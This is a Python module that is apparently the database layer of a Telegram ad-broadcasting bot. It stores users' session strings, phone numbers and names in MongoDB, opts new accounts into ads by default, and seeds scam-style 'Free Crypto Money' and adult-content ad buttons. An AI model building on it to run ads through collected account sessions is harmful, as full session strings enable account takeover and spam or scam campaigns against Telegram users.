import os
import time
import threading
from datetime import datetime, timedelta

import requests
from pymongo import MongoClient, ASCENDING
from pymongo.errors import PyMongoError

from config import (
    MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID,
    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
)

mongo_client = None
db = None
db_connected = False

users_col = None
ads_config_col = None
temp_sessions_col = None
ads_logs_col = None
broadcast_msgs_col = None

_config_lock = threading.RLock()
_db_lock = threading.RLock()

_last_ping = 0.0
_PING_INTERVAL = 30

# ---- Media extensions ----
ALLOWED_IMAGE_EXT = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
ALLOWED_VIDEO_EXT = {"mp4", "mov", "avi", "mkv", "webm", "m4v", "3gp"}
ALLOWED_EXT       = ALLOWED_IMAGE_EXT | ALLOWED_VIDEO_EXT

# Default ads — buttons only
DEFAULT_ADS = [
    {
        "id": "ad1",
        "has_button": True,
        "label": "Adult Content Available",
        "url": "https://example.com/adult",
    },
    {
        "id": "ad2",
        "has_button": True,
        "label": "Free Crypto Money",
        "url": "https://example.com/crypto",
    },
]

_CFG_DEFAULTS = {
    "ads_enabled": False,
    "interval": DEFAULT_INTERVAL_SEC,
    "caption": "",
    "media_path": None,
    "media_type": None,
    "photo_path": None,
    "delete_after_round": False,
}


def _default_config():
    config = {
        "_id": "main_config",
        "updated_at": datetime.now(),
    }
    config.update(_CFG_DEFAULTS)
    config["ads"] = [dict(ad) for ad in DEFAULT_ADS]
    return config


def _ensure_indexes():
    if users_col is None:
        return
    try:
        users_col.create_index([("phone", ASCENDING)])
        users_col.create_index([("user_id", ASCENDING)])
        users_col.create_index([("ads_enabled", ASCENDING)])
        temp_sessions_col.create_index([("created_at", ASCENDING)])
        broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
        broadcast_msgs_col.create_index([("sent_at", ASCENDING)])
    except PyMongoError as exc:
        print(f"MongoDB index error: {exc}")


def _connect():
    global mongo_client, db, db_connected
    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    global _last_ping

    with _db_lock:
        old_client = mongo_client
        mongo_client = None
        db = None
        db_connected = False
        users_col = ads_config_col = temp_sessions_col = ads_logs_col = broadcast_msgs_col = None

        if old_client is not None:
            try:
                old_client.close()
            except Exception:
                pass

        client = None
        try:
            if not MONGODB_URI:
                raise ValueError("MONGODB_URI is not configured")

            client = MongoClient(
                MONGODB_URI,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
                socketTimeoutMS=10000,
                retryWrites=True,
            )
            database = client[DB_NAME]
            client.admin.command("ping")

            mongo_client = client
            db = database
            db_connected = True

            users_col = db.users
            ads_config_col = db.ads_config
            temp_sessions_col = db.temp_sessions
            ads_logs_col = db.ads_logs
            broadcast_msgs_col = db.broadcast_msgs

            _last_ping = time.time()
            print("MongoDB connected successfully")
            _ensure_indexes()
            return True

        except Exception as exc:
            print(f"MongoDB connection failed: {exc}")
            if client is not None:
                try:
                    client.close()
                except Exception:
                    pass
            mongo_client = None
            db = None
            db_connected = False
            users_col = ads_config_col = temp_sessions_col = ads_logs_col = broadcast_msgs_col = None
            _last_ping = time.time()
            return False


def ensure_db():
    global _last_ping, db_connected
    with _db_lock:
        now = time.time()
        if mongo_client is None or not db_connected:
            return _connect()
        if now - _last_ping < _PING_INTERVAL:
            return True
        try:
            mongo_client.admin.command("ping")
            db_connected = True
            _last_ping = time.time()
            return True
        except Exception as exc:
            print(f"MongoDB ping failed: {exc}")
            return _connect()


def init_db():
    return _connect()


def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT


def media_kind(filename):
    if not filename or "." not in filename:
        return None
    ext = filename.rsplit(".", 1)[1].lower()
    if ext in ALLOWED_VIDEO_EXT:
        return "video"
    if ext in ALLOWED_IMAGE_EXT:
        return "photo"
    return None


def delete_photo_file(path):
    try:
        if path and os.path.isfile(path):
            os.remove(path)
    except OSError as exc:
        print(f"Could not delete {path}: {exc}")


# ---------------- sessions ----------------

def save_session_to_db(session_data):
    if not ensure_db() or users_col is None:
        return False
    try:
        phone = session_data["phone"]
        payload = {
            "session_string": session_data["session_string"],
            "updated_at": datetime.now(),
            "user_id": session_data["id"],
            "username": session_data.get("username"),
            "first_name": session_data.get("first_name", ""),
            "last_name": session_data.get("last_name", ""),
            "status": "active",
        }

        existing = users_col.find_one({"phone": phone})
        if existing:
            users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
            return str(existing["_id"])

        payload.update({
            "phone": phone,
            "session_name": session_data.get("session_name"),
            "created_at": datetime.now(),
            "ads_enabled": True,
            "last_ad_time": None,
            "deliveries": 0,
            "failures": 0,
        })
        result = users_col.insert_one(payload)
        return str(result.inserted_id)

    except (PyMongoError, KeyError, TypeError) as exc:
        print(f"Save session error: {exc}")
        return False


# ---------------- config ----------------

def get_ads_config():
    if not ensure_db() or ads_config_col is None:
        return _default_config()
    try:
        config = ads_config_col.find_one({"_id": "main_config"})
        if not config:
            default_config = _default_config()
            ads_config_col.update_one(
                {"_id": "main_config"},
                {"$setOnInsert": default_config},
                upsert=True,
            )
            config = ads_config_col.find_one({"_id": "main_config"}) or default_config

        for key, value in _CFG_DEFAULTS.items():
            config.setdefault(key, value)
        config.setdefault("ads", [dict(ad) for ad in DEFAULT_ADS])

        # Backfill media_path from legacy photo_path
        if not config.get("media_path") and config.get("photo_path"):
            config["media_path"] = config["photo_path"]
        if not config.get("media_type") and config.get("media_path"):
            config["media_type"] = media_kind(config["media_path"]) or "photo"

        # ---- Migration: legacy ads missing has_button → default True ----
        migrated = False
        for ad in config.get("ads", []):
            if "has_button" not in ad:
                ad["has_button"] = True
                migrated = True
        if migrated:
            try:
                ads_config_col.update_one(
                    {"_id": "main_config"},
                    {"$set": {"ads": config["ads"]}},
                )
                print("🔧 Migrated legacy ads — set has_button=True")
            except PyMongoError as e:
                print(f"Migration write failed: {e}")

        return config

    except PyMongoError as exc:
        print(f"Get ads config error: {exc}")
        return _default_config()


def update_ads_config(updates):
    if not ensure_db() or ads_config_col is None:
        return False
    updates = dict(updates)
    updates.pop("_id", None)
    updates["updated_at"] = datetime.now()
    try:
        with _config_lock:
            ads_config_col.update_one(
                {"_id": "main_config"},
                {"$set": updates},
                upsert=True,
            )
        return True
    except PyMongoError as exc:
        print(f"Update ads config error: {exc}")
        return False


def inc_ads_config(field, amount=1):
    if not ensure_db() or ads_config_col is None:
        return False
    if (not isinstance(field, str) or not field or field == "_id"
            or field.startswith("$") or "." in field):
        return False
    try:
        ads_config_col.update_one(
            {"_id": "main_config"},
            {"$inc": {field: amount}},
            upsert=True,
        )
        return True
    except PyMongoError as exc:
        print(f"Increment ads config error: {exc}")
        return False


def mutate_ads(mutator):
    with _config_lock:
        config = get_ads_config()
        ads = [dict(ad) for ad in config.get("ads", [])]
        new_ads = mutator(ads)
        if new_ads is None:
            return None
        if update_ads_config({"ads": new_ads}):
            return new_ads
        return None


def reset_ads_config():
    config = get_ads_config()
    old_media = config.get("media_path") or config.get("photo_path")
    success = update_ads_config({
        "ads": [dict(ad) for ad in DEFAULT_ADS],
        "caption": "",
        "media_path": None,
        "media_type": None,
        "photo_path": None,
    })
    return old_media if success else None


# ---------------- stats ----------------

def get_stats():
    empty = {
        "total_users": 0, "active_users": 0, "idle_users": 0,
        "opted_in": 0, "total_deliveries": 0, "total_broadcasts": 0,
        "db_connected": False, "active_sessions": 0, "pending_msgs": 0,
        "online_users": 0, "recent_users": 0,
        "last_broadcast_at": None, "next_broadcast_at": None,
        "broadcast_mode_users": 0,
        "registered_last_hour": 0, "ads_sent_last_hour": 0,
    }
    if not ensure_db() or users_col is None:
        return empty
    try:
        total     = users_col.count_documents({})
        active    = users_col.count_documents({"status": "active"})
        idle      = users_col.count_documents({"status": "idle"})
        opted_in  = users_col.count_documents({"ads_enabled": True})

        agg = list(users_col.aggregate([{
            "$group": {
                "_id": None,
                "d": {"$sum": {"$ifNull": ["$deliveries", 0]}},
                "f": {"$sum": {"$ifNull": ["$failures", 0]}},
            }
        }]))
        deliveries = agg[0]["d"] if agg else 0

        yesterday = datetime.now() - timedelta(days=1)
        recent = users_col.count_documents({"created_at": {"$gte": yesterday}})

        last_hour = datetime.now() - timedelta(hours=1)
        online = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

        # ---- New: registered in last 60 min ----
        registered_last_hour = users_col.count_documents({"created_at": {"$gte": last_hour}})

        pending = (broadcast_msgs_col.count_documents({})
                   if broadcast_msgs_col is not None else 0)

        # ---- New: ads sent in last 60 min ----
        ads_sent_last_hour = 0
        if broadcast_msgs_col is not None:
            ads_sent_last_hour = broadcast_msgs_col.count_documents(
                {"sent_at": {"$gte": last_hour}}
            )

        config = get_ads_config()

        return {
            "total_users": total,
            "active_users": active,
            "idle_users": idle,
            "opted_in": opted_in,
            "total_deliveries": deliveries,
            "total_broadcasts": config.get("total_broadcasts", 0),
            "online_users": online,
            "recent_users": recent,
            "pending_msgs": pending,
            "db_connected": db_connected,
            "active_sessions": 0,
            "last_broadcast_at": config.get("last_broadcast_at"),
            "next_broadcast_at": config.get("next_broadcast_at"),
            "broadcast_mode_users": opted_in,
            "registered_last_hour": registered_last_hour,
            "ads_sent_last_hour": ads_sent_last_hour,
        }
    except PyMongoError as exc:
        print(f"Get stats error: {exc}")
        return empty


def get_all_users():
    if not ensure_db() or users_col is None:
        return []
    try:
        output = []
        for user in users_col.find().sort("created_at", -1):
            ca = user.get("created_at")
            la = user.get("last_ad_time")
            output.append({
                "id": str(user.get("_id")),
                "user_id": user.get("user_id"),
                "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
                "username": user.get("username") or "N/A",
                "phone": user.get("phone") or "N/A",
                "status": user.get("status", "unknown"),
                "ads_enabled": user.get("ads_enabled", True),
                "deliveries": user.get("deliveries", 0),
                "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
                "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
            })
        return output
    except PyMongoError as exc:
        print(f"Get all users error: {exc}")
        return []


def send_to_channel(message):
    if not BOT_TOKEN:
        print("BOT_TOKEN is not configured")
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHANNEL_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if response.status_code != 200:
            print(f"Telegram HTTP error: {response.status_code}")
            return False
        result = response.json()
        if not result.get("ok"):
            print(f"Telegram API error: {result}")
        return result.get("ok", False)
    except (requests.RequestException, ValueError) as exc:
        print(f"Telegram channel error: {exc}")
        return False


init_db()
